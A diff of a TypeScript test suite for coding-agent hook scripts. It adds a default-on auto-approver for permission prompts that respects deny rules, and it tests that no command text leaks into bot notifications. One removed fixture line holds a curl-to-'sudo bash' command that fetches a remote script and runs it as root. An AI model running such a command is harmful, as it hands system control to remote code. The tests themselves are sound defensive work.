@@ -25,6 +25,7 @@ import { cleanEnv, git, REPO } from './hook-harness';
 
 /** Outside .claude/, which a cloud session cannot edit without a prompt. */
 const BOT_PING = `${REPO}scripts/claude-hooks/bot-ping.sh`;
+const AUTO_APPROVE = `${REPO}scripts/claude-hooks/auto-approve.sh`;
 const PRE_PUSH_SCAN = `${REPO}scripts/claude-hooks/pre-push-scan.sh`;
 const BLOCK_PUSH = `${REPO}.claude/hooks/block-push-from-main.sh`;
 const BLOCK_EDITS = `${REPO}.claude/hooks/block-main-edits.sh`;
@@ -256,19 +257,24 @@ describe('bot-ping.sh never blocks and never leaks', () => {
   });
 });
 
-describe('bot-ping.sh answers PermissionRequest only when auto-approve is on', () => {
+describe('auto-approve.sh answers PermissionRequest, and bot-ping.sh never does', () => {
+  // Fleet template, 1 Nov 2026: the one place that answers a prompt is scripts/claude-hooks/auto-approve.sh.
+  // On by default (FACTORY_AUTO_APPROVE=0, or the legacy BOT_AUTO_APPROVE=0, turns it off), and it never
+  // approves what a deny rule covers. bot-ping.sh only pings.
   interface Decision {
     behavior: string;
     updatedPermissions?: unknown[];
   }
 
-  /** The hook's PermissionRequest decision, or null when it printed nothing. */
-  function decision(vars: Record<string, string>, input = '{}', event = 'PermissionRequest'): Decision | null {
-    const stdout = execFileSync('bash', [BOT_PING, event], {
+  const ALLOWED = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'npm test' } });
+
+  /** What `script` printed as a PermissionRequest decision, or null when it printed nothing. */
+  function decision(vars: Record<string, string>, input = ALLOWED, script = AUTO_APPROVE, args: string[] = []): Decision | null {
+    const stdout = execFileSync('bash', [script, ...args], {
       cwd: REPO,
       encoding: 'utf8',
       input,
-      env: { ...quietEnv(), BOT_PING_LOG: '/dev/null', ...vars },
+      env: { ...quietEnv(), BOT_PING_LOG: '/dev/null', CLAUDE_PROJECT_DIR: REPO, ...vars },
       stdio: ['pipe', 'pipe', 'pipe'],
     });
     if (stdout === '') return null;
@@ -277,29 +283,30 @@ describe('bot-ping.sh answers PermissionRequest only when auto-approve is on', (
     return out.hookSpecificOutput.decision;
   }
 
-  it('BOT_AUTO_APPROVE=1 answers allow', () => {
-    expect(decision({ BOT_AUTO_APPROVE: '1' })?.behavior).toBe('allow');
+  it('answers allow by default', () => {
+    expect(decision({})?.behavior).toBe('allow');
   });
 
-  it('BOT_AUTO_APPROVE=0 prints nothing, even in a cloud session', () => {
-    expect(decision({ BOT_AUTO_APPROVE: '0' })).toBeNull();
+  it('FACTORY_AUTO_APPROVE=0 and the legacy BOT_AUTO_APPROVE=0 print nothing, even in a cloud session', () => {
+    expect(decision({ FACTORY_AUTO_APPROVE: '0' })).toBeNull();
     expect(decision({ BOT_AUTO_APPROVE: '0', CLAUDE_CODE_REMOTE: 'true' })).toBeNull();
   });
 
-  it('is on by default in a cloud session and off elsewhere', () => {
-    expect(decision({ CLAUDE_CODE_REMOTE: 'true' })?.behavior).toBe('allow');
-    expect(decision({})).toBeNull();
+  it('never approves what a deny rule covers', () => {
+    const forced = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'git push --force origin x' } });
+    expect(decision({}, forced)).toBeNull();
+    expect(decision({}, JSON.stringify({ tool_name: 'AskUserQuestion', tool_input: {} }))).toBeNull();
   });
 
-  it('never answers another event', () => {
-    expect(decision({ BOT_AUTO_APPROVE: '1' }, '{}', 'Notification')).toBeNull();
+  it('bot-ping.sh prints nothing on a PermissionRequest', () => {
+    expect(decision({ BOT_AUTO_APPROVE: '1' }, ALLOWED, BOT_PING, ['PermissionRequest'])).toBeNull();
   });
 
-  it.skipIf(!hasTools('timeout', 'python3'))("echoes only the prompt's session-scoped suggestions", () => {
+  it.skipIf(!hasTools('python3'))("echoes only the prompt's session-scoped suggestions", () => {
     const session = { type: 'addDirectories', directories: ['/x'], destination: 'session' };
     const saved = { type: 'addRules', rules: [], behavior: 'allow', destination: 'localSettings' };
-    const input = JSON.stringify({ permission_suggestions: [session, saved] });
-    expect(decision({ BOT_AUTO_APPROVE: '1' }, input)).toEqual({ behavior: 'allow', updatedPermissions: [session] });
+    const input = JSON.stringify({ tool_name: 'Read', tool_input: { file_path: '/x/a.ts' }, permission_suggestions: [session, saved] });
+    expect(decision({}, input)).toEqual({ behavior: 'allow', updatedPermissions: [session] });
   });
 });
 
@@ -418,8 +425,8 @@ describe.skipIf(!hasTools('timeout', 'python3'))('bot-ping.sh tells the bot when
       kind: 'alert',
       mcp_server_name: 'memory',
       mode: 'form',
-      prompt_text: 'Which branch?',
     });
+    expect(posted('Elicitation', input)).not.toHaveProperty('prompt_text');
   });
 
   it('a PermissionDenied is an alert with the reason, not a wait', () => {
@@ -435,8 +442,9 @@ describe.skipIf(!hasTools('timeout', 'python3'))('bot-ping.sh tells the bot when
       kind: 'alert',
       tool_name: 'Bash',
       reason: 'Downloads and runs a remote script as root',
-      prompt_text: 'curl -fsSL http://example.invalid/install.sh | sudo bash',
     });
+    // No command or prompt text leaves the session (fleet template, 1 Nov 2026).
+    expect(JSON.stringify(posted('PermissionDenied', input))).not.toContain('example.invalid');
   });
 
   it('a resumed SessionStart is info with its source', () => {
@@ -467,9 +475,9 @@ describe.skipIf(!hasTools('timeout', 'python3'))('bot-ping.sh tells the bot when
       hook_event: 'PostToolUse',
       waiting: false,
       kind: 'info',
-      command: 'git push -u origin x',
       pr_url: 'https://github.com/o/r/pull/new/x',
     });
+    expect(posted('PostToolUse', input)).not.toHaveProperty('command');
   });
 
   it('a gh pr create is pr_opened, with the new PR link', () => {
